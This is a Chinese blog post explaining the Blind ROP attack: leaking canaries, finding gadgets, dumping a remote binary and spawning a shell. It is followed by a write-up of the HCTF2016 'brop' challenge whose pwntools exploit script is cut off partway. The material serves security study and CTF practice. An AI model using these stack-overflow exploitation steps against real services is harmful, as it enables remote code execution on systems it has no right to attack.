@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这块内容比较比较多，就单独拉出一篇来记录了  概念 在没有获取到对应的源码和二进制文件下对程序进行攻击，劫持程序控制流  相关概念  阻塞读取：在阻塞模式下，如果程序可以进行读写就读写，反之就休眠进程，释放CPU资源 非阻塞读取：在非阻塞模式下，如果程序可以进行读写就读写，反之跳过读写，继续执行程序 阻塞和非阻塞的实现方式都是靠设备驱动程序   攻击条件  源程序必须存在栈溢出漏洞，以便于攻击者可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-BROP concept and example">
+<meta property="og:url" content="http://example.com/2022/12/25/pwn-BROP/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="这块内容比较比较多，就单独拉出一篇来记录了  概念 在没有获取到对应的源码和二进制文件下对程序进行攻击，劫持程序控制流  相关概念  阻塞读取：在阻塞模式下，如果程序可以进行读写就读写，反之就休眠进程，释放CPU资源 非阻塞读取：在非阻塞模式下，如果程序可以进行读写就读写，反之跳过读写，继续执行程序 阻塞和非阻塞的实现方式都是靠设备驱动程序   攻击条件  源程序必须存在栈溢出漏洞，以便于攻击者可">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pictures/brop.png">
+<meta property="og:image" content="http://example.com/pictures/plt2got.png">
+<meta property="article:published_time" content="2022-12-25T04:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="Bind Return Oriented Programming">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pictures/brop.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pwn-BROP concept and example</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/12/30/pwn-gdbgef/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/12/24/pwn-ret2csu/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/25/pwn-BROP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/25/pwn-BROP/&text=pwn-BROP concept and example"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/25/pwn-BROP/&is_video=false&description=pwn-BROP concept and example"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn-BROP concept and example&body=Check out this article: http://example.com/2022/12/25/pwn-BROP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/25/pwn-BROP/&name=pwn-BROP concept and example&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/25/pwn-BROP/&t=pwn-BROP concept and example"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text"> 相关概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text"> 攻击条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%A2%84%E8%A7%88"><span class="toc-number">4.</span> <span class="toc-text"> 攻击预览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dump%E5%86%85%E5%AD%98"><span class="toc-number">5.</span> <span class="toc-text"> Dump内存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text"> Canary防护绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEstop-gadget"><span class="toc-number">5.2.</span> <span class="toc-text"> 寻找stop gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E5%88%A9%E7%94%A8gadget"><span class="toc-number">5.3.</span> <span class="toc-text"> 寻找可利用gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump%E5%86%85%E5%AD%98-2"><span class="toc-number">5.4.</span> <span class="toc-text"> dump内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text"> 实行攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ending"><span class="toc-number">7.</span> <span class="toc-text"> Ending</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update-20221227"><span class="toc-number">8.</span> <span class="toc-text"> Update: 2022&#x2F;12&#x2F;27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hctf2016-brop"><span class="toc-number">9.</span> <span class="toc-text"> HCTF2016 brop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#service"><span class="toc-number">9.1.</span> <span class="toc-text"> service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">9.2.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#source"><span class="toc-number">9.3.</span> <span class="toc-text"> Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">9.4.</span> <span class="toc-text"> Exploit</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwn-BROP concept and example
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-25T04:00:00.000Z" itemprop="datePublished">2022-12-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PWN/">PWN</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Bind-Return-Oriented-Programming/" rel="tag">Bind Return Oriented Programming</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这块内容比较比较多，就单独拉出一篇来记录了</p>
+<h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2>
+<p>在没有获取到对应的源码和二进制文件下对程序进行攻击，劫持程序控制流</p>
+<h2 id="相关概念"><a class="markdownIt-Anchor" href="#相关概念"></a> 相关概念</h2>
+<ul>
+<li>阻塞读取：在阻塞模式下，如果程序可以进行读写就读写，反之就休眠进程，释放CPU资源</li>
+<li>非阻塞读取：在非阻塞模式下，如果程序可以进行读写就读写，反之跳过读写，继续执行程序</li>
+<li>阻塞和非阻塞的实现方式都是靠设备驱动程序</li>
+</ul>
+<h2 id="攻击条件"><a class="markdownIt-Anchor" href="#攻击条件"></a> 攻击条件</h2>
+<ul>
+<li><strong>源程序必须存在栈溢出漏洞</strong>，以便于攻击者可以控制程序流程。</li>
+<li>服务器端的进程在崩溃之后会重新启动，并且<strong>重新启动的进程的地址与先前的地址一样</strong></li>
+</ul>
+<p>为了达成攻击我们需要足够多的gadgets来进行write系统调用，能够让我们让我们从二进制中dump更多核心字节内容到攻击者socket；通过这些手段我们便可以开始基础的ROP攻击，攻击除了可以攻击一些专线进程服务，针对一些非开源的主流服务也是十分有效的手段</p>
+<p>我们之所以能够攻击完全是因为程序在崩溃后Fork了一个新进程，并没有进行任何的随机化处理，nginx工作方式就符合上诉</p>
+<h2 id="攻击预览"><a class="markdownIt-Anchor" href="#攻击预览"></a> 攻击预览</h2>
+<ul>
+<li><code>stack reading</code>: 找到返回地址或者canaries之类的信息</li>
+<li>Find <code>stop gadget</code>: 需要找到这个gadget我们才能找到其他的gadget</li>
+<li>Find <code>BROP gadget</code>: 允许我们控制调用的前两个参数的gadget</li>
+<li>Find <code>call strcmp</code>: 可以让我们设置调用函数的第三个参数值大于0</li>
+<li>Find <code>call write</code></li>
+<li>Write binary to socket</li>
+<li>Dump <code>symbol tabls</code>: 攻击者通过字节交互dump出有用信息，类似于execve等有用信息，并且可以可以注入构造的shellcode从而拿到shell</li>
+</ul>
+<p>更多的内容网上的更全，只是列一个大纲方便回忆</p>
+<h2 id="dump内存"><a class="markdownIt-Anchor" href="#dump内存"></a> Dump内存</h2>
+<p>我们首先需要的是把内存从服务端dump到本地，所以我们需要构造一个ROP链，基本如下<br />
+write(int sock,void *buff,int len)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop rdi ; ret;</span><br><span class="line">pop rsi ; ret;</span><br><span class="line">pop rdx ; ret;</span><br><span class="line">call write ; ret;</span><br></pre></td></tr></table></figure>
+<p>但是在此之前我们需要做一些准备工作，对于未知的远端程序要直接找到这样符合要求的gadgets几乎是不可能的，并且一般的服务器还对此开启了ASLR，Canary等防护</p>
+<h3 id="canary防护绕过"><a class="markdownIt-Anchor" href="#canary防护绕过"></a> Canary防护绕过</h3>
+<p>这里用<code>stack reading</code>的方法，以下列栈为列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer[4096b]--canary[8]--frame pointer--return addr</span><br></pre></td></tr></table></figure>
+<p>这里我们在覆盖的时候将x填写到4097bit处，为canary的第一位，此时如果x刚好与canary的第一位符合那么程序便不会崩溃，直到最后一位尝试结束后程序不会崩溃我们就拿到了canary值</p>
+<h3 id="寻找stop-gadget"><a class="markdownIt-Anchor" href="#寻找stop-gadget"></a> 寻找stop gadget</h3>
+<p>一般情况下我们如果在rop的return address处放置一段任意地址那么程序很大可能会直接crash，造成交互链接被远程关闭；那么如果这个时候出现了一种特殊情况，程序return address指向了特殊的代码段，程序跳转到那里后并不会crash，而是造成了无限循环；这可以是攻击者长期与保持会话连接，对我们寻找其余的gadgets起到了很大的作用</p>
+<h3 id="寻找可利用gadget"><a class="markdownIt-Anchor" href="#寻找可利用gadget"></a> 寻找可利用gadget</h3>
+<p>假设此时也找到了stop gadget；</p>
+<p>我们此时仅能在栈上进行操作，通过覆盖return address进行后续的操作，如果我们此时找到了例如<code>pop rdi;ret;</code>这样有用的gadget，程序执行这个有效gadget后还是会继续跳转到栈上的下一个地址进行执行，并且也是大几率直接crash。栈结构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer--ret(useful gadget)--0xdeadbeef-0xdeafbeef</span><br></pre></td></tr></table></figure>
+<p>这一过程在攻击者看来只是一个普通的程序crash流程，因为攻击者也不知道程序再此之前已经执行过了useful gadget；<strong>但是，此时我们上一个步骤找到的stop gadget就起到了作用</strong>，我们只需要把stop gadget在return address后面填充足够多，那么就能保证在程序不崩溃的情况下筛选出<code>有效的gadget</code>或者是<code>stop gadget</code>，我这里提到的刚好是另一个stop gadget是一种特殊情况，不过不要紧，后序还会对这些进行验证筛选</p>
+<h3 id="dump内存-2"><a class="markdownIt-Anchor" href="#dump内存-2"></a> dump内存</h3>
+<p>到这一步我们手里面应该有了canary值、有效stop gadgets、和一些useful gadget；我们的任务就是从其中找到dump数据所需要的四个gadgets</p>
+<p>首先我们需要找到brop gadget，这里借用一下wooyun匿名人士的过程图<br />
+<img src="/pictures/brop.png" alt="brop_gadget" /><br />
+<code>pop rsi;ret</code>和<code>pop rdi;ret</code>这两个gadget借助<code>top gadget</code>是容易找到的，但是<code>pop rdx；ret;</code>这个gadget很难找到，作者这里提出了一种思路就是把管理rdx这项工作交给strcmp，因为在调用改函数时，函数会把字符串长度赋值给rdx</p>
+<p><strong>寻找brop gadget:</strong><br />
+我们需要寻找的<code>brop gadget</code>需要依次pop 6个寄存器，形式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop rbx</span><br><span class="line">pop rbp</span><br><span class="line">pop r12</span><br><span class="line">pop r13</span><br><span class="line">pop r14</span><br><span class="line">pop r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>寻找brop gadget的方法很简单，如下栈，就不用–链接了，直接回车直观点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stop gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">return address(brop gadget)</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure>
+<p>如果这里ret执行地址刚好是brop gadget跳转执行后，那么我们后面的crash gadget就不会对程序造成影响，程序依然会进入挂起状态</p>
+<p><strong>寻找@plt</strong><br />
+这个东西有什么用就不多解释了，直接看图<br />
+<img src="/pictures/plt2got.png" alt="plt2got" /></p>
+<p>plt每一项都是16字节对齐的，第0个字节指向该对应函数的fastpath，第6个字节指向该对应函数的slowpath；<br />
+大部分的plt项都不会因为传进来的参数而导致程序crash，只是会返回DEFALUT错误；所以我们判读这是否是一个plt项的条件就是很多连续的16字节对齐地址，并且都不对程序造成crash；地址+6访问slowpath也不会造成程序的crash，那么这很可能就是plt项了</p>
+<p><strong>判断strcmp或者write</strong><br />
+上面提到brop gadget可以让我们自由控制前两个参数值，可以根据strcmp的以下特点找到对应plt项<br />
+strcmp：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">arg1</th>
+<th style="text-align:center">arg2</th>
+<th style="text-align:center">result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">readable</td>
+<td style="text-align:center">0x0</td>
+<td style="text-align:center">crash</td>
+</tr>
+<tr>
+<td style="text-align:center">0x0</td>
+<td style="text-align:center">readable</td>
+<td style="text-align:center">crash</td>
+</tr>
+<tr>
+<td style="text-align:center">0x0</td>
+<td style="text-align:center">0x0</td>
+<td style="text-align:center">crash</td>
+</tr>
+<tr>
+<td style="text-align:center">readable</td>
+<td style="text-align:center">readable</td>
+<td style="text-align:center">nocrash</td>
+</tr>
+</tbody>
+</table>
+<p>而write就简单了，直接调用向交互写入看看有没有回显我们就能轻易判断，最后一步就是如何确定传给write的socket文件描述符是多少了。<br />
+这里有两种办法：</p>
+<ol>
+<li>同时调用好几次write，把它们串起来，然后传入不同的文件描述符数</li>
+<li>同时打开多个连接，然后使用一个相对较大的文件描述符数字，增加匹配的可能性<br />
+到这一步为止，攻击者就能够将整个.text段从内存中通过socket写到本地来了，然后就可以对其进行反编译，找到其他更多的gadgets，同时，攻击者还可以dump那些symbol table之类的信息，找到PLT中其它对应的函数项如dup2和execve等</li>
+</ol>
+<h2 id="实行攻击"><a class="markdownIt-Anchor" href="#实行攻击"></a> 实行攻击</h2>
+<ul>
+<li>重定向socket IO（交互输入输出）</li>
+<li>想办法搞到/bin/sh;这里如果在dump下来的内存中没找到可以选择找一段可写区域把字段内容读过去</li>
+<li>execve执行，不行就试试找到<code>pop rax;ret;</code>和<code>call syscall</code>进行系统调用</li>
+</ul>
+<h2 id="ending"><a class="markdownIt-Anchor" href="#ending"></a> Ending</h2>
+<p>可以说原理并不是很复杂，主要难度体现在dump数据这一部分，我们搜集到了足够多的<code>useful gadget</code>这一个步骤的难度就会降低；接下来明天或者之后更新一下模拟brop crack；是算是我接触到一种新的攻击方式，感觉Bind ROP还是很酷的。</p>
+<hr />
+<h2 id="update-20221227"><a class="markdownIt-Anchor" href="#update-20221227"></a> Update: 2022/12/27</h2>
+<p>更新：不新开了，直接在概念下更新例解</p>
+<h2 id="hctf2016-brop"><a class="markdownIt-Anchor" href="#hctf2016-brop"></a> HCTF2016 brop</h2>
+<h3 id="service"><a class="markdownIt-Anchor" href="#service"></a> service</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./a.out -kl 127.0.0.1 2710</span><br></pre></td></tr></table></figure>
+<h3 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> checksec</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>比起原文提到的少了Canary，方便多了</p>
+<h3 id="source"><a class="markdownIt-Anchor" href="#source"></a> Source</h3>
+<p>Github提供程序和源码下载，实在不懂可以看着源码分析<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">Github</a></p>
+<h3 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h3>
+<p>需要注意的事项：</p>
+<ol>
+<li>在获取stop gadget时</li>
+</ol>
+<ul>
+<li>需要我们保持可以输入下一段payload的状态，找到对应的程序入口地址</li>
+<li>需要处理的情况包含进入了其他入口、地址包含错误内容导致程序崩溃</li>
+</ul>
+<ol start="2">
+<li>寻找寄存器控制地址</li>
+</ol>
+<ul>
+<li>这里需要十分注意以下，pop r15; ret对应的字节码是<code>41 5F C3</code>，而pop rdi;ret;对应的字节码是<code>5F C3</code>,以下是<code>x64 brop gadget</code>的机器码形式，顺便推一下这个网站<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">disassembly</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4007ba:	5b                   	pop    %rbx</span><br><span class="line">4007bb:	5d                   	pop    %rbp</span><br><span class="line">4007bc:	41 5c                	pop    %r12</span><br><span class="line">4007be:	41 5d                	pop    %r13</span><br><span class="line">4007c0:	41 5e                	pop    %r14</span><br><span class="line">4007c2:	41 5f                	pop    %r15</span><br><span class="line">4007c4:	c3                   	ret</span><br></pre></td></tr></table></figure>
+</li>
+<li>由此我们推断出pop rdi; ret;的机器码是<code>5F C3</code>,地址是<code>brop_gadget+9</code></li>
+</ul>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Protection :Canary NX FORTIFY</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_overflow_len</span>():</span><br><span class="line">    <span class="built_in">len</span>=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">len</span>)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> string.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="built_in">len</span>+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=========Get Overflow Lenth==========&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">len</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_stop_gadget</span>(<span class="params">buff</span>):</span><br><span class="line">    based_addr=<span class="number">0x4005c0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function recved:&quot;</span>+<span class="built_in">str</span>(buff))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========Get Stop gadget==========&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(based_addr)))</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(based_addr)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> string.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                p.close()</span><br><span class="line">                based_addr+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span 